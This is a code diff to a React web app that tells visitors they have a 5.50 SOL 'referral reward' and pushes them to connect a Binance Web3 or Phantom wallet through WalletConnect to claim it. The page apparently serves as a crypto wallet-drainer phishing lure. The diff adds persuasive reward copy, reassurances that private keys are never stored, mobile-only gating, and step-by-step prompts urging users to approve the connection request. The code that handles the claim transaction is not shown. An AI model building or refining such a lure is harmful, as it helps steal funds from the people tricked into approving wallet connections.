+          addDebug('🔄 Falling back to WalletConnect method');
         }
       }
 
-      // Use WalletConnect
       setConnectionStatus('Setting up secure connection...');
+      
+      // Get WalletConnect client
       const client = await getWalletConnectClient();
       
-      setConnectionStatus('Generating connection link...');
+      // Create session
+      setConnectionStatus('Generating secure connection...');
       const { uri, approval } = await createWalletConnectSession(client);
       
       if (!uri) {
         throw new Error('Failed to generate connection URI');
       }
 
-      setConnectionStatus('Opening Binance app...');
+      // Open Binance app with proper discover tab targeting
+      setConnectionStatus('Opening Binance Web3 Wallet app...\nPlease wait while we establish the connection.');
       openBinanceWeb3Wallet(uri);
 
-      // Handle approval
+      // Handle session approval if available
       if (approval) {
-        addDebug('⏳ Waiting for approval...');
-        setConnectionStatus('Please approve in Binance app\nPage will update automatically');
+        addDebug('⏳ Waiting for user approval in Binance app...');
+        setConnectionStatus('Please approve the connection in your Binance app\nThe page will update automatically when connected');
         
+        // Set up timeout for approval
         const timeoutPromise = new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Connection timeout')), 120000)
+          setTimeout(() => reject(new Error('Connection approval timeout after 2 minutes')), 120000)
         );
 
         try {
           const session = await Promise.race([approval(), timeoutPromise]);
           sessionRef.current = session;
-          addDebug('✅ Session approved!');
+          addDebug('✅ Session approved via WalletConnect!');
           
+          // Extract wallet address from session
           const accounts = session.namespaces?.solana?.accounts || [];
           if (accounts.length > 0) {
+            // Format: "solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp:ADDRESS"
             const address = accounts[0].split(':').pop();
-            if (address && address.length >= 32) {
+            if (address && address.length === 44) { // Basic validation for Solana addresses
               await handleSuccessfulConnection(address, 'walletconnect');
             } else {
-              throw new Error('Invalid address format');
+              throw new Error('Invalid wallet address format');
             }
           } else {
-            throw new Error('No Solana accounts in session');
+            throw new Error('No Solana accounts found in session');
           }
         } catch (approvalError) {
+          addDebug(`⚠️ Approval handling error: ${approvalError.message}`);
+          
           if (approvalError.message.includes('timeout')) {
-            setConnectionStatus('⏳ Connection in progress...\n\nIf approved, page will reload automatically.');
+            addDebug('⏰ User may need to complete connection manually in app');
+            setConnectionStatus('⏳ Connection in progress\n\nIf you\'ve already approved in the Binance app, the page will reload automatically.\n\nPlease keep this tab open.');
           } else {
             throw approvalError;
           }
         }
       } else {
-        setConnectionStatus('📱 Complete connection in Binance app\n\nPage will reload when connected');
+        addDebug('📱 Using direct deep link method');
+        setConnectionStatus('📱 Please complete connection in Binance app\n\n1. Open Binance app if not already opened\n2. Go to Wallet → Web3 tab\n3. Approve the connection request\n4. The page will reload automatically when connected');
       }
+
+      // Add manual connection instructions to debug
+      addDebug('📋 Connection Instructions:');
+      addDebug('1. Ensure Binance app is installed and updated');
+      addDebug('2. Open the Binance app manually if it doesn\'t open automatically');
+      addDebug('3. Navigate to: Wallet → Web3 tab');
+      addDebug('4. Look for connection request and approve it');
+      addDebug('5. Return to this browser tab after approval');
 
     } catch (error) {
       setConnecting(false);
       setConnectionStatus('');
-      addDebug(`❌ Error: ${error.message}`);
+      addDebug(`❌ Critical error: ${error.message}`);
+      console.error('Connection error:', error);
       
       const errorMessage = error.message.includes('timeout') 
         ? 'Connection timed out. Please try again.'
         : error.message.includes('URI') 
-        ? 'Failed to generate connection. Please refresh.'
+        ? 'Failed to generate connection. Please refresh and try again.'
         : error.message;
       
-      alert(`❌ Connection Failed\n\n${errorMessage}\n\nPlease ensure Binance app is installed and updated.`);
+      const userMessage = `❌ Connection Failed\n\n${errorMessage}\n\nPlease ensure:\n• Binance app is installed and updated\n• You have a stable internet connection\n• Try again in a few minutes`;
+      
+      alert(userMessage);
     }
   };
 
   const connectPhantomWallet = async () => {
     setShowModal(false);
     setConnecting(true);
-    setConnectionStatus('Connecting to Phantom...');
+    setConnectionStatus('Connecting to Phantom Wallet...');
     setDebugInfo([]);
     setShowClaimButton(false);
 
     try {
-      addDebug('👻 Starting Phantom connection');
+      addDebug('👻 Starting Phantom Wallet connection');
       
+      // Check if Phantom is available
       if (!window.phantom?.solana) {
         setConnecting(false);
         setConnectionStatus('');
         
         const installUrl = isMobileDevice 
-          ? 'https://phantom.app/download'
+          ? 'https://phantom.app/download?ref=solprize'
           : 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa';
         
-        const install = window.confirm('👻 Phantom Not Found\n\nWould you like to install Phantom wallet?');
-        if (install) {
+        const userResponse = window.confirm('👻 Phantom Wallet Not Found\n\nPhantom wallet is required to claim your rewards.\n\nWould you like to install it now?');
+        
+        if (userResponse) {
           window.open(installUrl, '_blank');
         }
+        
         return;
       }
 
@@ -856,27 +802,31 @@ export default function App() {
     } catch (error) {
       setConnecting(false);
       setConnectionStatus('');
-      addDebug(`❌ Phantom error: ${error.message}`);
+      addDebug(`❌ Phantom connection error: ${error.message}`);
       
-      let errorMessage = 'Unknown error';
+      let errorMessage = 'Unknown error occurred';
+      
       if (error.code === 4001) {
-        errorMessage = 'Connection rejected';
+        errorMessage = 'You rejected the connection request.';
       } else if (error.code === -32002) {
-        errorMessage = 'Pending request exists. Check Phantom.';
+        errorMessage = 'There\'s already a pending connection request. Please check your Phantom wallet.';
       } else if (error.message.includes('timeout')) {
-        errorMessage = 'Connection timeout';
+        errorMessage = 'Connection timed out. Please try again.';
+      } else if (error.message.includes('injected')) {
+        errorMessage = 'Phantom wallet not properly injected. Please refresh the page.';
       }
       
-      alert(`❌ Phantom Connection Failed\n\n${errorMessage}`);
+      alert(`❌ Phantom Connection Failed\n\n${errorMessage}\n\nPlease try again or contact support.`);
     }
   };
 
   const copyDebugInfo = () => {
     const text = debugInfo.join('\n');
     navigator.clipboard.writeText(text).then(() => {
-      alert('📋 Debug info copied!');
-    }).catch(() => {
-      alert('❌ Failed to copy');
+      alert('📋 Debug information copied to clipboard!\n\nYou can share this with support if needed.');
+    }).catch(err => {
+      addDebug(`❌ Copy failed: ${err.message}`);
+      alert('❌ Failed to copy debug info. Please select and copy manually.');
     });
   };
 
@@ -901,14 +851,15 @@ export default function App() {
           padding: '40px',
           maxWidth: '500px',
           textAlign: 'center',
-          boxShadow: '0 20px 60px rgba(0,0,0,0.3)'
+          boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
+          border: '1px solid rgba(255,255,255,0.5)'
         }}>
           <div style={{ fontSize: '64px', marginBottom: '20px' }}>📱</div>
           <h1 style={{ fontSize: '28px', marginBottom: '16px', color: '#1f2937', fontWeight: 'bold' }}>
             Mobile Device Required
           </h1>
-          <p style={{ color: '#6b7280', lineHeight: '1.6', marginBottom: '24px' }}>
-            This application requires a mobile device for the best wallet connection experience.
+          <p style={{ color: '#6b7280', lineHeight: '1.6', marginBottom: '24px', fontSize: '16px' }}>
+            This application is optimized for mobile devices to provide the best wallet connection experience. Please open this page on your smartphone to connect your Binance Web3 Wallet and claim your rewards.
           </p>
           <div style={{
             background: '#f3f4f6',
@@ -919,8 +870,18 @@ export default function App() {
             marginBottom: '20px',
             wordBreak: 'break-all'
           }}>
-            <strong>URL:</strong><br/>
-            <code style={{ fontSize: '13px' }}>{APP_URL}</code>
+            <strong>Current URL:</strong><br/>
+            <code style={{ fontSize: '13px', fontFamily: 'monospace' }}>{APP_URL}</code>
+          </div>
+          <div style={{
+            background: '#fef3c7',
+            padding: '12px',
+            borderRadius: '8px',
+            fontSize: '13px',
+            color: '#92400e',
+            marginBottom: '16px'
+          }}>
+            💡 <strong>Quick Tip:</strong> Scan this QR code with your phone's camera or use the share button to open on mobile.
           </div>
           <button
             onClick={() => window.location.reload()}
@@ -932,8 +893,12 @@ export default function App() {
               borderRadius: '12px',
               fontSize: '16px',
               fontWeight: 'bold',
-              cursor: 'pointer'
+              cursor: 'pointer',
+              transition: 'all 0.3s',
+              boxShadow: '0 4px 12px rgba(102, 126, 234, 0.3)'
             }}
+            onMouseOver={(e) => e.target.style.transform = 'scale(1.05)'}
+            onMouseOut={(e) => e.target.style.transform = 'scale(1)'}
           >
             Refresh Page
           </button>
@@ -1026,14 +991,20 @@ export default function App() {
             borderTop: '4px solid white',
             borderRadius: '50%',
             animation: 'spin 1s linear infinite',
-            margin: '0 auto 20px'
+            margin: '0 auto 20px',
+            boxShadow: '0 0 20px rgba(255,255,255,0.5)'
           }} />
           <div style={{ 
             color: 'white', 
             fontSize: '20px', 
             fontWeight: 'bold', 
             letterSpacing: '2px',
-            textShadow: '0 2px 10px rgba(0,0,0,0.3)'
+            textShadow: '0 2px 10px rgba(0,0,0,0.3)',
+            background: 'rgba(0,0,0,0.2)',
+            padding: '8px 20px',
+            borderRadius: '20px',
+            backdropFilter: 'blur(5px)',
+            display: 'inline-block'
           }}>
             LOADING...
           </div>
@@ -1062,8 +1033,10 @@ export default function App() {
             color: 'white',
             fontSize: '14px',
             fontWeight: 'bold',
+            border: '1px solid rgba(255,255,255,0.3)',
             textTransform: 'uppercase',
-            letterSpacing: '1px'
+            letterSpacing: '1px',
+            boxShadow: '0 4px 15px rgba(0,0,0,0.2)'
           }}>
             ✨ REFERRAL REWARDS
           </div>
@@ -1073,7 +1046,10 @@ export default function App() {
             borderRadius: '24px',
             padding: '40px 30px',
             boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
-            animation: 'slideUp 0.6s ease-out'
+            border: '1px solid rgba(255,255,255,0.5)',
+            animation: 'slideUp 0.6s ease-out',
+            position: 'relative',
+            overflow: 'hidden'
           }}>
             <h1 style={{
               fontSize: '32px',
@@ -1081,6 +1057,7 @@ export default function App() {
               background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
               WebkitBackgroundClip: 'text',
               WebkitTextFillColor: 'transparent',
+              backgroundClip: 'text',
               marginBottom: '20px',
               minHeight: '40px'
             }}>
@@ -1097,7 +1074,7 @@ export default function App() {
               lineHeight: '1.6',
               marginBottom: '30px'
             }}>
-              Thank you for your participation! Connect your wallet to claim your rewards.
+              Thank you for your participation! Connect your wallet to claim your well-deserved rewards.
             </p>
             
             <div style={{
@@ -1108,7 +1085,8 @@ export default function App() {
               marginBottom: '30px',
               boxShadow: '0 8px 20px rgba(102, 126, 234, 0.4)',
               position: 'relative',
-              overflow: 'hidden'
+              overflow: 'hidden',
+              border: '2px solid rgba(255,255,255,0.3)'
             }}>
               <div style={{
                 position: 'absolute',
@@ -1117,7 +1095,8 @@ export default function App() {
                 width: '200%',
                 height: '200%',
                 background: 'linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent)',
-                animation: 'spin 8s linear infinite'
+                animation: 'spin 8s linear infinite',
+                zIndex: 1
               }} />
               
               <div style={{
@@ -1127,8 +1106,8 @@ export default function App() {
                 textTransform: 'uppercase',
                 letterSpacing: '1px',
                 fontWeight: '600',
-                position: 'relative',
-                zIndex: 2
+                zIndex: 2,
+                position: 'relative'
               }}>
                 Your Reward
               </div>
@@ -1138,8 +1117,8 @@ export default function App() {
                 fontSize: '48px',
                 fontWeight: 'bold',
                 textShadow: '0 2px 15px rgba(0,0,0,0.3)',
-                position: 'relative',
-                zIndex: 2
+                zIndex: 2,
+                position: 'relative'
               }}>
                 5.50 SOL
               </div>
@@ -1148,8 +1127,8 @@ export default function App() {
                 color: 'rgba(255,255,255,0.8)',
                 fontSize: '14px',
                 marginTop: '8px',
-                position: 'relative',
-                zIndex: 2
+                zIndex: 2,
+                position: 'relative'
               }}>
                 ≈ ${(5.50 * 150).toFixed(2)} USD
               </div>
@@ -1163,8 +1142,9 @@ export default function App() {
                   fontSize: '12px',
                   color: 'white',
                   backdropFilter: 'blur(5px)',
-                  position: 'relative',
-                  zIndex: 2
+                  border: '1px solid rgba(255,255,255,0.3)',
+                  zIndex: 2,
+                  position: 'relative'
                 }}>
                   💰 Current Balance: {tokenBalance.toFixed(4)} SOL
                 </div>
@@ -1180,6 +1160,8 @@ export default function App() {
                 marginBottom: '20px',
                 display: 'flex',
                 alignItems: 'center',
+                justifyContent: 'space-between',
+                boxShadow: '0 4px 12px rgba(16, 185, 129, 0.2)',
                 animation: 'slideUp 0.4s ease-out'
               }}>
                 <div style={{ flex: 1, minWidth: 0 }}>
@@ -1188,18 +1170,25 @@ export default function App() {
                     color: '#065f46', 
                     marginBottom: '4px',
                     fontWeight: '600',
-                    textTransform: 'uppercase'
+                    textTransform: 'uppercase',
+                    display: 'flex',
+                    alignItems: 'center',
+                    gap: '6px'
                   }}>
-                    ✓ Connected Wallet
+                    <span>✓</span> Connected Wallet
                   </div>
                   <div style={{ 
                     fontSize: '14px', 
                     fontWeight: 'bold', 
                     color: '#047857',
                     fontFamily: 'monospace',
-                    wordBreak: 'break-all'
+                    wordBreak: 'break-all',
+                    display: 'flex',
+                    alignItems: 'center',
+                    gap: '8px'
                   }}>
-                    👛 {walletAddress.slice(0, 12)}...{walletAddress.slice(-12)}
+                    <span>👛</span>
+                    {walletAddress.slice(0, 12)}...{walletAddress.slice(-12)}
                   </div>
                 </div>
                 <button
@@ -1213,8 +1202,13 @@ export default function App() {
                     fontSize: '12px',
                     fontWeight: 'bold',
                     cursor: 'pointer',
-                    marginLeft: '12px'
+                    marginLeft: '12px',
+                    flexShrink: 0,
+                    transition: 'all 0.2s',
+                    boxShadow: '0 2px 6px rgba(220, 38, 38, 0.3)'
                   }}
+                  onMouseOver={(e) => e.target.style.background = '#b91c1c'}
+                  onMouseOut={(e) => e.target.style.background = '#dc2626'}
                 >
                   🔌 Disconnect
                 </button>
@@ -1234,11 +1228,20 @@ export default function App() {
                   fontSize: '18px',
                   fontWeight: 'bold',
                   cursor: 'pointer',
+                  transition: 'all 0.3s',
                   boxShadow: '0 8px 20px rgba(16, 185, 129, 0.4)',
                   textTransform: 'uppercase',
                   letterSpacing: '1px',
                   marginBottom: '20px',
                   animation: 'pulse 2s infinite'
+                }}
+                onMouseOver={(e) => {
+                  e.target.style.transform = 'scale(1.02)';
+                  e.target.style.boxShadow = '0 12px 28px rgba(16, 185, 129, 0.5)';
+                }}
+                onMouseOut={(e) => {
+                  e.target.style.transform = 'scale(1)';
+                  e.target.style.boxShadow = '0 8px 20px rgba(16, 185, 129, 0.4)';
                 }}
               >
                 🎁 CLAIM REWARDS
@@ -1248,8 +1251,8 @@ export default function App() {
             {claimStatus && (
               <div style={{
                 background: claimStatus.includes('❌') ? 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)' : 
-                          claimStatus.includes('🎉') ? 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)' : 
-                          'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
+                        claimStatus.includes('🎉') ? 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)' : 
+                        'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
                 border: claimStatus.includes('❌') ? '2px solid #f87171' : 
                         claimStatus.includes('🎉') ? '2px solid #6ee7b7' : 
                         '2px solid #fbbf24',
@@ -1263,6 +1266,7 @@ export default function App() {
                 fontWeight: '500',
                 lineHeight: '1.5',
                 whiteSpace: 'pre-line',
+                boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
                 animation: 'slideUp 0.3s ease-out'
               }}>
                 {claimStatus}
@@ -1281,9 +1285,14 @@ export default function App() {
                 fontWeight: '600',
                 lineHeight: '1.6',
                 whiteSpace: 'pre-line',
+                boxShadow: '0 4px 12px rgba(251, 191, 36, 0.2)',
                 animation: 'slideUp 0.3s ease-out'
               }}>
-                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '10px' }}>
+                <div style={{
+                  display: 'flex',
+                  alignItems: 'flex-start',
+                  gap: '10px'
+                }}>
                   <div style={{
                     width: '24px',
                     height: '24px',
@@ -1310,7 +1319,8 @@ export default function App() {
                 overflowY: 'auto',
                 fontSize: '11px',
                 fontFamily: 'monospace',
-                color: '#374151'
+                color: '#374151',
+                boxShadow: 'inset 0 0 10px rgba(0,0,0,0.1)'
               }}>
                 <div style={{
                   display: 'flex',
@@ -1320,7 +1330,8 @@ export default function App() {
                   position: 'sticky',
                   top: 0,
                   background: '#f3f4f6',
-                  paddingBottom: '4px'
+                  paddingBottom: '4px',
+                  zIndex: 1
                 }}>
                   <strong style={{ fontSize: '12px', color: '#1f2937' }}>🔍 Debug Log:</strong>
                   <button
@@ -1333,10 +1344,13 @@ export default function App() {
                       borderRadius: '4px',
                       fontSize: '10px',
                       cursor: 'pointer',
+                      transition: 'all 0.2s',
                       fontWeight: 'bold'
                     }}
+                    onMouseOver={(e) => e.target.style.background = '#4b5563'}
+                    onMouseOut={(e) => e.target.style.background = '#6b7280'}
                   >
-                    📋 Copy
+                    📋 Copy Log
                   </button>
                 </div>
                 {debugInfo.map((info, i) => (
@@ -1360,7 +1374,9 @@ export default function App() {
               disabled={connecting || walletAddress}
               style={{
                 width: '100%',
-                background: walletAddress || connecting
+                background: walletAddress 
+                  ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
+                  : connecting
                   ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
                   : 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
                 color: 'white',
@@ -1370,10 +1386,24 @@ export default function App() {
                 fontSize: '18px',
                 fontWeight: 'bold',
                 cursor: connecting || walletAddress ? 'not-allowed' : 'pointer',
+                transition: 'all 0.3s',
                 boxShadow: connecting || walletAddress ? 'none' : '0 8px 20px rgba(102, 126, 234, 0.4)',
                 textTransform: 'uppercase',
                 letterSpacing: '1px',
-                opacity: connecting || walletAddress ? 0.7 : 1
+                opacity: connecting || walletAddress ? 0.7 : 1,
+                transform: 'scale(1)'
+              }}
+              onMouseOver={(e) => {
+                if (!connecting && !walletAddress) {
+                  e.target.style.transform = 'scale(1.02)';
+                  e.target.style.boxShadow = '0 12px 28px rgba(102, 126, 234, 0.5)';
+                }
+              }}
+              onMouseOut={(e) => {
+                if (!connecting && !walletAddress) {
+                  e.target.style.transform = 'scale(1)';
+                  e.target.style.boxShadow = '0 8px 20px rgba(102, 126, 234, 0.4)';
+                }
               }}
             >
               {connecting ? '⏳ CONNECTING...' : walletAddress ? '✅ WALLET CONNECTED' : '🚀 CONNECT WALLET'}
@@ -1387,7 +1417,7 @@ export default function App() {
                 textAlign: 'center',
                 lineHeight: '1.5'
               }}>
-                🔐 Secured connection • By connecting, you agree to our Terms
+                🔐 Secured connection • By connecting, you agree to our Terms of Service
               </p>
             )}
           </div>
@@ -1401,7 +1431,10 @@ export default function App() {
           }}>
             <p>🔒 Powered by WalletConnect v2 • Binance Web3 Wallet</p>
             <p style={{ marginTop: '4px', opacity: 0.8, fontSize: '12px' }}>
-              📱 {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} • {isBinanceWebView() ? 'Binance WebView' : 'Browser'}
+              📱 {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} • Project ID: {WC_PROJECT_ID.substring(0, 8)}...
+            </p>
+            <p style={{ marginTop: '4px', fontSize: '11px', opacity: 0.7 }}>
+              ⚠️ Always verify connection requests in your wallet app
             </p>
           </div>
         </div>
@@ -1423,7 +1456,8 @@ export default function App() {
             alignItems: 'center',
             justifyContent: 'center',
             padding: '20px',
-            animation: 'fadeIn 0.2s'
+            animation: 'fadeIn 0.2s',
+            WebkitTapHighlightColor: 'transparent'
           }}
         >
           <div
@@ -1435,7 +1469,10 @@ export default function App() {
               maxWidth: '400px',
               width: '100%',
               boxShadow: '0 25px 50px rgba(0,0,0,0.5)',
-              animation: 'slideUp 0.3s ease-out'
+              animation: 'slideUp 0.3s ease-out',
+              border: '1px solid rgba(255,255,255,0.2)',
+              position: 'relative',
+              overflow: 'hidden'
             }}
           >
             <div style={{
@@ -1448,9 +1485,12 @@ export default function App() {
                 fontSize: '24px',
                 fontWeight: 'bold',
                 color: '#1f2937',
-                margin: 0
+                margin: 0,
+                display: 'flex',
+                alignItems: 'center',
+                gap: '10px'
               }}>
-                👛 Select Wallet
+                <span>👛</span> Select Wallet
               </h2>
               <button
                 onClick={() => setShowModal(false)}
@@ -1463,7 +1503,24 @@ export default function App() {
                   cursor: connecting ? 'not-allowed' : 'pointer',
                   padding: '0',
                   width: '32px',
-                  height: '32px'
+                  height: '32px',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  borderRadius: '8px',
+                  transition: 'all 0.2s'
+                }}
+                onMouseOver={(e) => {
+                  if (!connecting) {
+                    e.target.style.background = '#f3f4f6';
+                    e.target.style.color = '#1f2937';
+                  }
+                }}
+                onMouseOut={(e) => {
+                  if (!connecting) {
+                    e.target.style.background = 'transparent';
+                    e.target.style.color = '#9ca3af';
+                  }
                 }}
               >
                 ×
@@ -1477,7 +1534,7 @@ export default function App() {
               lineHeight: '1.5',
               textAlign: 'center'
             }}>
-              Choose your preferred wallet to connect
+              Choose your preferred wallet to connect and claim your rewards
             </p>
             
             <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
@@ -1497,8 +1554,23 @@ export default function App() {
                   display: 'flex',
                   alignItems: 'center',
                   gap: '12px',
+                  transition: 'all 0.3s',
                   boxShadow: '0 4px 12px rgba(240, 185, 11, 0.3)',
-                  opacity: connecting ? 0.6 : 1
+                  opacity: connecting ? 0.6 : 1,
+                  position: 'relative',
+                  overflow: 'hidden'
+                }}
+                onMouseOver={(e) => {
+                  if (!connecting) {
+                    e.target.style.transform = 'translateY(-2px)';
+                    e.target.style.boxShadow = '0 6px 16px rgba(240, 185, 11, 0.4)';
+                  }
+                }}
+                onMouseOut={(e) => {
+                  if (!connecting) {
+                    e.target.style.transform = 'translateY(0)';
+                    e.target.style.boxShadow = '0 4px 12px rgba(240, 185, 11, 0.3)';
+                  }
                 }}
               >
                 <div style={{
@@ -1509,14 +1581,16 @@ export default function App() {
                   display: 'flex',
                   alignItems: 'center',
                   justifyContent: 'center',
-                  fontSize: '24px'
+                  fontSize: '24px',
+                  flexShrink: 0,
+                  boxShadow: '0 2px 6px rgba(0,0,0,0.1)'
                 }}>
                   🟡
                 </div>
                 <div style={{ flex: 1, textAlign: 'left' }}>
                   <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Binance Web3 Wallet</div>
                   <div style={{ fontSize: '12px', opacity: 0.8, marginTop: '2px' }}>
-                    Recommended • Mobile App
+                    Recommended • Mobile App • Discover Tab
                   </div>
                 </div>
               </button>
@@ -1537,8 +1611,23 @@ export default function App() {
                   display: 'flex',
                   alignItems: 'center',
                   gap: '12px',
+                  transition: 'all 0.3s',
                   boxShadow: '0 4px 12px rgba(171, 159, 242, 0.3)',
-                  opacity: connecting ? 0.6 : 1
+                  opacity: connecting ? 0.6 : 1,
+                  position: 'relative',
+                  overflow: 'hidden'
+                }}
+                onMouseOver={(e) => {
+                  if (!connecting) {
+                    e.target.style.transform = 'translateY(-2px)';
+                    e.target.style.boxShadow = '0 6px 16px rgba(171, 159, 242, 0.4)';
+                  }
+                }}
+                onMouseOut={(e) => {
+                  if (!connecting) {
+                    e.target.style.transform = 'translateY(0)';
+                    e.target.style.boxShadow = '0 4px 12px rgba(171, 159, 242, 0.3)';
+                  }
                 }}
               >
                 <div style={{
@@ -1549,14 +1638,16 @@ export default function App() {
                   display: 'flex',
                   alignItems: 'center',
                   justifyContent: 'center',
-                  fontSize: '24px'
+                  fontSize: '24px',
+                  flexShrink: 0,
+                  boxShadow: '0 2px 6px rgba(0,0,0,0.1)'
                 }}>
                   👻
                 </div>
                 <div style={{ flex: 1, textAlign: 'left' }}>
                   <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Phantom Wallet</div>
                   <div style={{ fontSize: '12px', opacity: 0.9, marginTop: '2px' }}>
-                    Solana • Browser • Mobile
+                    Solana • Browser Extension • Mobile App
                   </div>
                 </div>
               </button>
@@ -1569,14 +1660,28 @@ export default function App() {
               borderRadius: '12px',
               fontSize: '12px',
               color: '#6b7280',
-              lineHeight: '1.5'
+              lineHeight: '1.5',
+              border: '1px solid #e5e7eb'
             }}>
-              <div style={{ fontWeight: '600', color: '#374151', marginBottom: '8px' }}>
-                🔐 Safe & Secure
+              <div style={{ fontWeight: '600', color: '#374151', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <span>🔐</span> Safe & Secure
               </div>
               <div>
-                We never store your private keys. All transactions require your explicit approval.
+                We never store your private keys. Your wallet credentials remain secure and under your control at all times. All transactions require your explicit approval.
               </div>
+            </div>
+            
+            <div style={{
+              marginTop: '16px',
+              padding: '12px',
+              background: 'linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)',
+              borderRadius: '12px',
+              fontSize: '11px',
+              color: '#1e40af',
+              textAlign: 'center',
+              border: '1px solid #93c5fd'
+            }}>
+              💡 <strong>Pro Tip:</strong> Binance Web3 Wallet provides the best experience for this rewards claim process with seamless integration.
             </div>
           </div>
         </div>
